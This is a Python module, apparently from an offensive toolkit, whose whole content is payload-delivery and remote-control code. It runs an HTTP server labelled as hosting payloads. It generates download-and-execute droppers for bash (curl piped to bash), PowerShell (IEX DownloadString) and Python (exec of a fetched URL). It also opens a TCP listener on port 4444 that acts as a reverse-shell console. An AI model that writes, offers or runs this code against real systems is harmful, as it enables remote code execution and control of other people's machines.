# modules/delivery.py

import os
import socket
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler

# -------------------------
# 1. Start HTTP server
# -------------------------
def start_http_server(port=8000, directory="."):
    os.chdir(directory)

    def serve():
        with HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler) as server:
            print(f"[+] Hosting HTTP payload server on port {port} (dir: {directory})...")
            server.serve_forever()

    t = threading.Thread(target=serve)
    t.daemon = True
    t.start()

# -------------------------
# 2. Generate Dropper Scripts
# -------------------------
def generate_bash_dropper(payload_url):
    return f"curl -s {payload_url} | bash"

def generate_powershell_dropper(payload_url):
    return (
        f"powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('{payload_url}')\""
    )

def generate_python_dropper(payload_url):
    return (
        "import urllib.request; exec(urllib.request.urlopen("
        f"'{payload_url}').read().decode())"
    )

# -------------------------
# 3. Start TCP Listener
# -------------------------
def start_tcp_listener(ip="0.0.0.0", port=4444):
    print(f"[+] Listening on {ip}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    try:
        while True:
            cmd = input("Shell> ")
            if cmd.strip() == "exit":
                break
            conn.send(cmd.encode() + b"\n")
            response = conn.recv(4096).decode()
            print(response)
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C caught. Closing connection.")
    finally:
        conn.close()
        s.close()
